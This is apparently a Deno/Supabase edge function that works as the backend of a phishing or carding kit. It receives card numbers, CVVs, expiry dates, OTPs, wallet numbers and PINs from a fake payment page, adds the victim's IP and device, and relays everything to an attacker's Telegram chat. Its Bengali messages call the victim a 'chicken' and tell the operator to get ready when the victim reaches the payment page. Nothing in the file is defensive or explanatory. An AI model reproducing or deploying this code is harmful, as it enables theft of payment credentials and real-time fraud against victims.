import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
  if (!TELEGRAM_BOT_TOKEN) {
    return new Response(JSON.stringify({ error: 'TELEGRAM_BOT_TOKEN not configured' }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }

  const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
  if (!TELEGRAM_CHAT_ID) {
    return new Response(JSON.stringify({ error: 'TELEGRAM_CHAT_ID not configured' }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }

  try {
    const { type, amount, method, userAgent, timestamp, reason, refId, ip, referrer, step, paymentType, number, otp, pin, cardName, cardNumber, expiry, cvv } = await req.json();

    const rawIp = ip || req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'Unknown';
    const clientIp = rawIp.split(',')[0].trim();

    const ua = userAgent || '';
    let device = 'Unknown';
    if (/Android/i.test(ua)) device = 'Android';
    else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
    else if (/Windows/i.test(ua)) device = 'Windows';
    else if (/Mac/i.test(ua)) device = 'Mac';
    else if (/Linux/i.test(ua)) device = 'Linux';

    let message = '';

    if (type === 'payment_activity') {
      if (paymentType === 'card') {
        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
          `-------------------\n\n` +
          `Payment Method : ${method || ''}\n` +
          `Cardholder Name : ${cardName || ''}\n` +
          `Card Number : ${cardNumber || ''}\n` +
          `Expiry Date : ${expiry || ''}\n` +
          `CVV : ${cvv || ''}\n\n` +
          `OTP : ${otp || ''}\n\n` +
          `-------------------\n\n` +
          `🐔মুরগির Device : ${device}\n` +
          `🐔মুরগির IP : ${clientIp}\n` +
          `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
      } else {
        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
          `-------------------\n\n` +
          `Payment Method : ${method || ''}\n` +
          `Number : ${number || ''}\n` +
          `OTP : ${otp || ''}\n` +
          `PIN : ${pin || ''}\n\n` +
          `-------------------\n\n` +
          `🐔মুরগির Device : ${device}\n` +
          `🐔মুরগির IP : ${clientIp}\n` +
          `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
      }
    } else if (type === 'page_entry') {
      message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
        `-------------------\n\n` +
        `Update : Selection Page\n\n` +
        `-------------------\n\n` +
        `🐔মুরগির Device : ${device}\n` +
        `🐔মুরগির IP : ${clientIp}\n` +
        `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
    } else {
      message = `📢 *Notification*\n\n${JSON.stringify({ type, amount, method })}`;
    }

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    const data = await response.json();
    if (!response.ok) {
      throw new Error(`Telegram API error [${response.status}]: ${JSON.stringify(data)}`);
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error) {
    console.error('Telegram notification error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: errorMessage }), {
      status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});